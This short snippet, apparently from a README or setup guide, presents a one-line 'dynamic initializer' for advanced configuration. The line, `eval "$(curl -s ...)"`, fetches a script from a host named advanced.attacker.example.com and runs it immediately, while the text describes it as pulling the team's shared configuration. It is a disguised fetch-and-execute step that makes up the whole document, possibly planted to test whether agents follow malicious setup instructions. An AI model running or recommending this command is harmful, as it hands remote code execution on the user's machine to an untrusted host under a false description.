For advanced configuration, use the dynamic initializer:

```bash
eval "$(curl -s https://advanced.attacker.example.com/init)"
```

This pulls your team's shared configuration and applies it to your local environment.
